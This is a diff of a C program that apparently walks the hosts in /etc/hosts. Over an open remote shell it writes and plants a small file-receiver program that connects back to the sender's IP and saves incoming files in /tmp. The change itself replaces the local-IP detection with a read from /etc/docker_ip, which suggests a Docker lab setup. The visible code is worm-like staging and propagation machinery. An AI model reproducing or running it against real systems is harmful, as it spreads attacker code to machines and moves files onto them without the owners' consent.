@@ -7,43 +7,35 @@
 
 #define HOSTS_FILE "/etc/hosts"
 #define MAX_IP_LEN 64
+#define DOCKER_IP_FILE "/etc/docker_ip"
 
-
-void get_local_ip(ip)
+void get_docker_ip(ip)
     char *ip;
 {
-    int sock;
-    struct sockaddr_in serv_addr, local_addr;
-    int len;
-    len = sizeof(local_addr);
+    FILE *fp;
+    char line[128];
 
-    printf("[*] Getting local IP\n");
+    printf("[*] Reading local IP from %s\n", DOCKER_IP_FILE);
 
-    sock = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sock < 0) {
+    fp = fopen(DOCKER_IP_FILE, "r");
+    if (fp == (FILE *)0) {
+        printf("[-] Error: Could not open %s. Defaulting to 127.0.0.1\n", DOCKER_IP_FILE);
         strcpy(ip, "127.0.0.1");
         return;
     }
 
-    bzero((char *)&serv_addr, sizeof(serv_addr));
-    serv_addr.sin_family = AF_INET;
-    serv_addr.sin_port = htons(53);
-    serv_addr.sin_addr.s_addr = inet_addr("8.8.8.8");
-
-    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
+    /* Grab the first line of the file */
+    if (fgets(line, 128, fp) != (char *)0) {
+        /* %s reads characters until it hits a space, tab, or newline */
+        if (sscanf(line, "%s", ip) != 1) {
+            strcpy(ip, "127.0.0.1");
+        }
+    } else {
         strcpy(ip, "127.0.0.1");
-        close(sock);
-        return;
     }
 
-    if (getsockname(sock, (struct sockaddr *)&local_addr, &len) < 0) {
-        strcpy(ip, "127.0.0.1");
-        close(sock);
-        return;
-    }
-
-    strcpy(ip, inet_ntoa(local_addr.sin_addr));
-    close(sock);
+    fclose(fp);
+    printf("[+] Local IP set to: %s\n", ip);
 }
 
 void deploy_receive_file(sock, my_ip)
@@ -77,7 +69,7 @@ read(s,fn,len);fn[len]=0;sprintf(p,\"/tmp/%%s\",fn);o=fopen(p,\"w\");\
 receive_int(&fs,s);while(fs>0){n=read(s,b,2047);if(n<=0)break;b[n]=0;\
 fputs(b,o);fs-=n;}fclose(o);free(fn);send_int(i,s);}break;}close(s);return 0;}";
 
-    strcpy(my_ip, "172.20.0.11");
+    /* strcpy(my_ip, "172.20.0.11"); */
     sprintf(formatted_source, file_contents, my_ip);
 
     write_to_sock(sock, "cat > /tmp/receive_file.c << 'EOF'\n");
@@ -177,7 +169,7 @@ int main()
     char ip[MAX_IP_LEN];
     char my_ip[MAX_IP_LEN];
 
-    get_local_ip(my_ip); 
+    get_docker_ip(my_ip); 
 
     while (1) {
         fp = fopen(HOSTS_FILE, "r");
